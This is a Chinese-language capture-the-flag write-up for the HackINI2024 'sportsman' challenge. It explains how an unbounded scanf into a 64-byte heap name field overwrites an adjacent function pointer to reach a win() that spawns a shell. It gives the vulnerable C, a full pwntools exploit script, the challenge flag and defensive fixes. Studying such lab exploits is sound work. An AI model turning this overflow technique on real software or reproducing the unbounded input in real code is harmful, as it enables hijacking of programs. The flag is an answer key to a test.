# HackINI2024 sportsman

## 题目简述

程序在堆上分配一个 `person` 结构体，其中包含 64 字节姓名数组和紧随其后的函数指针 `sport`。设置姓名时使用无长度限制的 `scanf("%s")`，因此可以越过姓名数组覆盖函数指针，再通过“执行运动”菜单间接调用隐藏的 `win()`。

## 解题过程

结构体和调用逻辑如下：

```c
struct person {
    char name[64];
    void (*sport)();
};

scanf("%s", person->name);
(*(person->sport))();
```

程序还包含：

```c
void win() {
    system("/bin/sh");
}
```

附件是未启用 PIE 的 64 位程序，所以 `win()` 地址固定。先选择菜单 1，输入 64 字节填充后追加 `win()` 的小端地址；这会恰好覆盖 `sport`。再选择菜单 3，程序便通过被篡改的函数指针调用 `win()`：

```python
from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
io = process(elf.path)

io.sendlineafter(b"Choice: ", b"1")
io.sendlineafter(b"Your name: ", b"A" * 64 + p64(elf.sym.win))
io.sendlineafter(b"Choice: ", b"3")
io.interactive()
```

进入 shell 后读取 flag 文件。仓库中的实际字符串为：

```text
shellamtes{BoF_i$_AL$0_th3R3_In_Da_h3ap}
```

其中 `shellamtes` 是题目附件和官方解答共同保留的拼写，应按服务实际输出提交，不能擅自改成通常的 `shellmates`。

## 方法总结

这是堆对象内部的相邻字段覆盖，不需要操纵堆分配器。看到“字符数组后紧跟函数指针”的结构时，应重点检查写入边界；从数组起点到指针的偏移就是 64 字节。防御时应限制输入宽度，例如使用 `%63s`，并避免把可写数据与敏感函数指针放在同一可溢出对象中。
